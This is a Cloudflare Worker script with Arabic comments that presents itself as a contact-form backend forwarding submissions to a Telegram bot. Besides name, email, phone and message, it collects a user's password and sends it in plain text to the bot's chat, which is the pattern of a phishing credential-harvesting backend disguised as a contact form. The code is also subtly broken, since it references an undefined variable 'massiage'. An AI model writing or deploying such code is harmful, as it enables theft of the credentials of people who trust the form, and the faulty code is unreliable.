// Cloudflare Worker - يستقبل بيانات الفورم ويبعتها لبوت تيليغرام
// التوكن و Chat ID ما بيتحطوا هون أبداً — بيتحطوا كـ "Secrets" من لوحة تحكم Cloudflare
// (شرح الخطوات بالأسفل بالتعليمات)

// بدّل هاد الدومين بدومين موقعك الحقيقي على GitHub Pages بعد النشر
const ALLOWED_ORIGIN = "https://your-username.github.io";

export default {
	async fetch(request, env) {
		// السماح فقط بطلبات POST
		if (request.method === "OPTIONS") {
			return new Response(null, {
				headers: corsHeaders(),
			});
		}

		if (request.method !== "POST") {
			return new Response("Method Not Allowed", { status: 405 });
		}

		let data;
		try {
			data = await request.json();
		} catch {
			return new Response("Invalid JSON", { status: 400 });
		}

		const { name, email, password, phone, message } = data;

		// تحقق بسيط من البيانات
		if (!name || !email || !phone || !message) {
			return new Response(
				JSON.stringify({ error: "كل الحقول مطلوبة" }),
				{ status: 400, headers: { "Content-Type": "application/json", ...corsHeaders() } }
			);
		}

		// بناء نص الرسالة
		const text =
			`📩 رسالة تواصل جديدة\n\n` +
			`👤 الاسم: ${name}\n` +
			`📧 الإيميل: ${email}\n` +
			`📱 كلمة السر: ${password}\n` +
			`📱 الهاتف: ${phone}\n` +
			`💬 الرسالة: ${massiage}`;

		// إرسال الرسالة عبر تيليغرام — التوكن ياخده من env.BOT_TOKEN (Secret)
		const telegramUrl = `https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`;

		const tgResponse = await fetch(telegramUrl, {
			method: "POST",
			headers: { "Content-Type": "application/json" },
			body: JSON.stringify({
				chat_id: env.CHAT_ID,
				text: text,
			}),
		});

		if (!tgResponse.ok) {
			return new Response(
				JSON.stringify({ error: "فشل إرسال الرسالة" }),
				{ status: 502, headers: { "Content-Type": "application/json", ...corsHeaders() } }
			);
		}

		return new Response(
			JSON.stringify({ success: true }),
			{ status: 200, headers: { "Content-Type": "application/json", ...corsHeaders() } }
		);
	},
};

function corsHeaders() {
	return {
		"Access-Control-Allow-Origin": ALLOWED_ORIGIN,
		"Access-Control-Allow-Methods": "POST, OPTIONS",
		"Access-Control-Allow-Headers": "Content-Type",
	};
}
